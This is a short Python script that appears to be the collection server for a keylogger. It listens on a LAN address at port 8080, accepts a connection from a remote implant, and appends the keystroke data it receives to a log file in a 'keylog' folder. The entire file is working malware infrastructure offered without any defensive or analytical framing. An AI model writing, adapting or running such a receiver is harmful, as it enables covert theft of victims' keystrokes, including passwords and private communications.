#!/usr/bin/python

import socket
import os

def createFolders():
	path = "/home/zevran/Documents/keylog"
	if(not(os.path.exists(path))):
		os.mkdir(path)
	os.chdir(path)
	return path

def createFile(path):
	if(not(os.path.exists(path+"log.txt"))):
		f = open("log.txt","a+")
		f.close()

def connecting(path):
	try:
		s = socket.socket()		
		s.bind(("192.168.88.128",8080))	
		print('Listening...')
		s.listen(1)			
		conn , addr = s.accept()	
		print('[+] We got a conection from ', addr)
		
		f = open("log.txt","a+")
		while True:				
			recvData = conn.recv(1024).decode('utf-8', errors="replace")
			print(recvData)
			f.write(recvData + "\n")
	except KeyboardInterrupt:
		print('[!] Server is terminated')
		conn.close()

def main():
	path = createFolders()
	createFile(path)
	connecting(path)
main()